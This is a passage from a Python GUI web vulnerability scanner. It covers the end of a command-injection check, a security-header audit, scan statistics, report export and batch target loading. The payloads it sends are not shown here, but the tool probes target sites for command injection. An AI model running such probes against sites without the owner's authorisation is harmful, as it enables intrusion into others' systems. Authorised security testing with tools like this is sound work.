                            vuln_type="Command Injection",
                            target=test_url,
                            payload=payload,
                            details=f"Command Injection vulnerability detected\nCan execute system commands\nPayload: {payload}"
                        )
                        break
                except:
                    continue
                    
    def check_security_headers(self, base_url):
        """Check for security headers"""
        try:
            response = requests.get(base_url, timeout=10, verify=False)
            headers = response.headers
            
            security_checks = [
                ("X-Frame-Options", "DENY or SAMEORIGIN"),
                ("X-Content-Type-Options", "nosniff"),
                ("X-XSS-Protection", "1; mode=block"),
                ("Strict-Transport-Security", "max-age=31536000"),
                ("Content-Security-Policy", "Various directives"),
                ("Referrer-Policy", "strict-origin-when-cross-origin"),
                ("Permissions-Policy", "Various permissions"),
            ]
            
            for header, recommendation in security_checks:
                if header not in headers:
                    self.add_vulnerability(
                        severity="LOW",
                        vuln_type="Missing Security Header",
                        target=base_url,
                        payload="",
                        details=f"Missing security header: {header}\nRecommendation: {recommendation}"
                    )
                    
        except Exception as e:
            self.log_message(f"Header check error: {str(e)}", "ERROR")
            
    def generate_statistics(self):
        """Generate scan statistics"""
        total = len(self.tree.get_children())
        critical = sum(1 for item in self.tree.get_children() 
                      if self.tree.item(item)['values'][1] == "CRITICAL")
        high = sum(1 for item in self.tree.get_children() 
                  if self.tree.item(item)['values'][1] == "HIGH")
        medium = sum(1 for item in self.tree.get_children() 
                    if self.tree.item(item)['values'][1] == "MEDIUM")
        low = sum(1 for item in self.tree.get_children() 
                 if self.tree.item(item)['values'][1] == "LOW")
        
        stats = f"""
╔══════════════════════════════════════════════╗
║           SCAN STATISTICS                    ║
╠══════════════════════════════════════════════╣
║ Total Vulnerabilities: {total:>18} ║
║ Critical:               {critical:>18} ║
║ High:                   {high:>18} ║
║ Medium:                 {medium:>18} ║
║ Low:                    {low:>18} ║
╠══════════════════════════════════════════════╣
║              VULNERABILITY TYPES             ║
╚══════════════════════════════════════════════╝

"""
        
        # Count by type
        type_counts = {}
        for item in self.tree.get_children():
            vuln_type = self.tree.item(item)['values'][2]
            type_counts[vuln_type] = type_counts.get(vuln_type, 0) + 1
            
        for vuln_type, count in type_counts.items():
            stats += f"• {vuln_type}: {count}\n"
            
        stats += f"\nScan completed: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        
        self.stats_text.delete(1.0, tk.END)
        self.stats_text.insert(tk.END, stats)
        
    def export_report(self):
        """Export scan report"""
        if not self.tree.get_children():
            messagebox.showwarning("No Data", "No vulnerabilities to export!")
            return
            
        filename = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        
        if filename:
            try:
                with open(filename, 'w') as f:
                    f.write("=" * 80 + "\n")
                    f.write("WEB VULNERABILITY SCAN REPORT\n")
                    f.write("=" * 80 + "\n\n")
                    
                    f.write(f"Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write(f"Target URL: {self.url_entry.get()}\n")
                    f.write(f"Total Issues: {len(self.tree.get_children())}\n\n")
                    
                    for item in self.tree.get_children():
                        values = self.tree.item(item)['values']
                        f.write(f"{'='*60}\n")
                        f.write(f"ID: {values[0]}\n")
                        f.write(f"Severity: {values[1]}\n")
                        f.write(f"Type: {values[2]}\n")
                        f.write(f"Target: {values[3]}\n")
                        f.write(f"Payload: {values[4]}\n")
                        f.write(f"Details: {values[5]}\n")
                        
                messagebox.showinfo("Success", f"Report saved to {filename}")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to save report: {str(e)}")
                
    def load_targets(self):
        """Load multiple targets from file"""
        filename = filedialog.askopenfilename(
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        
        if filename:
            try:
                with open(filename, 'r') as f:
                    urls = [line.strip() for line in f if line.strip()]
                    
                if urls:
                    # Create a new window for batch scanning
                    self.create_batch_scanner(urls)
            except Exception as e:
                messagebox.showerror("Error", f"Failed to load targets: {str(e)}")
                
    def create_batch_scanner(self, urls):
        """Create batch scanner window"""
        batch_window = tk.Toplevel(self.root)
        batch_window.title("Batch Scanner")
        batch_window.geometry("600x400")
        batch_window.configure(bg=self.colors['bg'])
        
        tk.Label(batch_window, text="Batch Scanning", 
                font=("Consolas", 16, "bold"),
                fg=self.colors['accent'],
                bg=self.colors['bg']).pack(pady=10)
        
        listbox = tk.Listbox(batch_window, bg='#2d2d30', fg='white',
                           font=("Consolas", 10))
        listbox.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        for url in urls:
            listbox.insert(tk.END, url)
            
        def start_batch_scan():
            selected = listbox.curselection()
            if selected:
                url = listbox.get(selected[0])
                self.url_entry.delete(0, tk.END)
                self.url_entry.insert(0, url)
                batch_window.destroy()
                self.start_scan()
                
        tk.Button(batch_window, text="Scan Selected", 
                 command=start_batch_scan,
                 font=("Consolas", 10, "bold"),
                 bg=self.colors['success'],
                 fg='white').pack(pady=10)

def main():
    """Main function"""
    root = tk.Tk()
    app = AdvancedSQLScanner(root)
    
    # Center window
    root.update_idletasks()
    width = root.winfo_width()
    height = root.winfo_height()
    x = (root.winfo_screenwidth() // 2) - (width // 2)
    y = (root.winfo_screenheight() // 2) - (height // 2)
    root.geometry(f'{width}x{height}+{x}+{y}')
    
    root.mainloop()

if __name__ == "__main__":
    main()
